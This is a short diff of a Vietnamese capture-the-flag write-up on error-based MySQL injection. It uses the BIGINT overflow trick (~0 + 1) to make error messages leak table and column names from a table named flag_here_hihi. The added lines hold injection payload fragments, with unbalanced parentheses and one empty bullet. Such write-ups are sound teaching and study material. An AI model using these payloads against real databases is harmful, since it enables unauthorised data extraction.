@@ -54,5 +54,6 @@ Vì ~0 là bigest int number --> ~0 + 1 --> mysql number out of range --> displa
 # BIGINT UNSIGNED value is out of range in '......'
 ```
 
-- `select * from flag_here_hihi limit 1` trả về tất cả column trong table `flag_here_hihi` tuy nhiên operand chỉ được phép có 1 column nên ta đưa results câu query này thành bảng a.
-- `select 1 from a` trả về `1 + ~0` trigger lỗi đồng thời dump ra các column có trong bảng a.
+- `1*(select ~0 + ( select 1 from flag_here_hihi limit 1 )` trả về error tên table mà sinh ra error
+- 
+- `1*(select ~0 + ( select 1 from (select * from flag_here_hihi limit 1 ) as a)` trả về error tên columns từ bảng flag_here_hihi sinh ra error(không phải tên a mà chính là các columns)
